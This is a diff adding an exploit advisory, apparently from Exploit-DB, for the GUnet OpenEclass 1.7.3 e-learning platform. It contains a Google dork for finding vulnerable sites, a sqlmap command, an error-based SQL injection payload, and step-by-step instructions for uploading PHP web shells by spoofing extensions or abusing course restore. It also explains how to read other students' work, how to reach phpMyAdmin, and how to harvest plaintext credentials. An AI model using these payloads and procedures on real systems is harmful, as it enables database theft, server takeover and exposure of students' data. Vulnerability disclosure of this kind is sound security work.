@@ -1,0 +1,116 @@
+# Exploit Title: GUnet OpenEclass 1.7.3 E-learning platform - 'month' SQL Injection
+# Google Dork: intext:"© GUnet 2003-2007" 	
+# Date: 2020-03-02
+# Exploit Author: emaragkos
+# Vendor Homepage: https://www.openeclass.org/
+# Software Link: http://download.openeclass.org/files/1.7/eclass-1.7.3.tar.gz
+# Version: 1.7.3 (2007)
+# Tested on: Ubuntu 12 (Apache 2.2.22, PHP 5.3.10, MySQL 5.5.38)
+# CVE : -
+
+Older versions are also vulnerable.
+
+Source code:
+http://download.openeclass.org/files/1.7/eclass-1.7.3.zip
+http://download.openeclass.org/files/1.7/eclass-1.7.3.tar.gz
+
+Setup instructions:
+http://download.openeclass.org/files/docs/1.7/Install.pdf
+
+Changelog:
+https://download.openeclass.org/files/docs/1.7/CHANGES.txt
+
+Manual:
+https://download.openeclass.org/files/docs/1.7/eClass.pdf
+
+############################################################################
+
+Unauthenticated Information Disclosure
+
+System info
+127.0.0.1/modules/admin/sysinfo 
+(powered by phpSysInfo 2.0 that is also vulnerable)
+
+Web-App version info
+127.0.0.1/README.txt
+127.0.0.1/info/about.php
+127.0.0.1/upgrade/CHANGES.txt
+
+############################################################################
+  
+(Authenticated - Requires student account) - Error-Based SQLi
+
+https://127.0.0.1/modules/agenda/myagenda.php?month=3&year=2020
+
+sqlmap -u "https://127.0.0.1/modules/agenda/myagenda.php?month=2&year=2020" --batch --dump
+
+---
+Parameter: month (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: month=5' AND (SELECT 9183 FROM(SELECT COUNT(*),CONCAT(0x7170717671,(SELECT (ELT(9183=9183,1))),0x716b706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Hztw&year=2020'
+---
+ 
+Almost every parameter will be either error-based, boolean-based or time-based vulnerable.
+If you have a student account I recommend using this error-based SQLi because you will get all the database content really faster.
+If you dont have an account use the following exploit that exploits an unauthenticated time-based blind injection.
+It will definately be a slower proccess but you will get the administrator account pretty fast and move on with exploiting other authenticated vulnerabilities.
+https://www.exploit-db.com/exploits/48106
+
+############################################################################
+
+(Authenticated - Requires student account) - PHP upload file extension bypass
+If you have a student account you can bypass file extension restrictions and upload a PHP shell.
+Register as user if the application is configured to allow registrations or use an SQLi to find an account that already exists.
+Start looking for a class that you can submit an exercise as a student.
+Register in that class and navigate to submit you exercise.
+If you try to upload a .php file it will be renamed to .phps to prevent execution.
+You can upload your PHP shell by spoofing the extension simply by renaming your .php file to .php3 or .PhP
+Once you have uploaded it, open your course directory and then add "work" directory at the end
+Course link example: https://127.0.0.1/courses/CS101/
+Course link becomes: https://127.0.0.1/courses/CS101/work/
+Directory listing will most likely be enabled by default and you will be able to view the directories.
+Your shell will be in one of the multiple random alphanumeric directories that look like this /4a0c01h2nad9b/
+Final shell link will look like this: https://127.0.0.1/courses/CS101/work/4a0c01h2nad9b/shell.php3
+
+The same method works with "groups" if you cant find a class that supports submitting an exercise.
+https://127.0.0.1/modules/group/group.php
+
+############################################################################
+
+(Authenticated - Requires student account) - View assessments of other students
+If you have a student account you can view uploaded assessments from other students before or after the deadline that the professor has set.
+Find the course link you are interested in.
+https://127.0.0.1/courses/CS101
+Add "work" directory at the end
+https://127.0.0.1/courses/CS101/work/
+Directory listing will most likely be enabled by default and you will be able to view and download other students' uploaded assessments.
+
+############################################################################
+
+(Authenticated - Requires admin account) - Upload PHP files 
+
+You have to login to the platform as an administrator or user with admin rights.
+You can grab the administrator credentials as plaintext with an Unauthenticated Blind SQL Injection using the
+following exploit https://www.exploit-db.com/exploits/48106 or use the authenticated SQLi for faster results.
+Once you have logged in as admin:
+1) Navigate to 127.0.0.1/modules/course_info/restore_course.php
+2) Upload your .php shell compressed in a .zip file
+3) Ignore the error message
+4) Your PHP file is now uploaded to 127.0.0.1/cources/tmpUnzipping/[your-shell-name].php 
+
+############################################################################
+
+(Authenticated - Requires admin account) - phpMyAdmin Remote Access 
+
+127.0.0.1/modules/admin/mysql
+phpMyAdmin 2.10.0.2 is installed by default and allows remote logins
+Once you have uploaded your shell can view the config.php file that contains the mysql password
+127.0.0.1/config/config.php 
+
+############################################################################
+
+(Authenticated - Requires admin account) - Plaintext password storage
+
+When logged in as admin you can view all registered users credentials as plaintext.
+127.0.0.1/modules/admin/listusers.php
